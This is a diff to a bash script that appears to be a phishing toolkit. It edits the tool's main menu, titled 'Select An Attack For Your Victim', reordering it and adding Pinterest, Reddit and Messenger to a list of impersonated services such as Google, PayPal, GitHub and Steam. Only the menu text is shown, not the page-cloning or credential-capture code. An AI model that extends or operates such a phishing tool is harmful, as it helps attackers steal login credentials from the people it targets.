@@ -883,31 +883,34 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}Select An Attack For Your Victim
+		${RED}Select An Attack For Your Victim:
 
-		${WHITE}1. Adobe
 		${WHITE}1. Airbnb
-		${WHITE}2. Facebook
-		${WHITE}3. Instagram
-		${WHITE}4. Google
-		${WHITE}5. Bitcoin
-		${WHITE}6. Crypto
-		${WHITE}7. Microsoft
-		${WHITE}8. Netflix
-		${WHITE}9. Paypal
-		${WHITE}10. Tiktok
-		${WHITE}11. Snapchat
-		${WHITE}12. Spotify
-		${WHITE}13. Github
-		${WHITE}14. Shopify
-		${WHITE}15. Ebay
-		${WHITE}16. Discord
-		${WHITE}17. Roblox
-		${WHITE}18. Steam
-		${WHITE}19. Playstation
-		${WHITE}20. Xbox
-		${WHITE}21. Verizon
-		${WHITE}22. Wifi
+		${WHITE}2. Adobe
+		${WHITE}3. Facebook
+		${WHITE}4. Instagram
+		${WHITE}5. Google
+		${WHITE}6. Bitcoin
+		${WHITE}7. Crypto
+		${WHITE}8. Microsoft
+		${WHITE}9. Netflix
+		${WHITE}10. Paypal
+		${WHITE}11. Tiktok
+		${WHITE}12. Snapchat
+		${WHITE}13. Spotify
+		${WHITE}14. Github
+		${WHITE}15. Shopify
+		${WHITE}16. Ebay
+		${WHITE}17. Pinterest
+		${WHITE}18. Discord
+		${WHITE}19. Reddit
+		${WHITE}20. Messenger
+		${WHITE}21. Roblox
+		${WHITE}22. Steam
+		${WHITE}23. Playstation
+		${WHITE}24. Xbox
+		${WHITE}25. Verizon
+		${WHITE}26. Wifi
 
 		${WHITE}99. About         ${WHITE}0. Exit
 	EOF
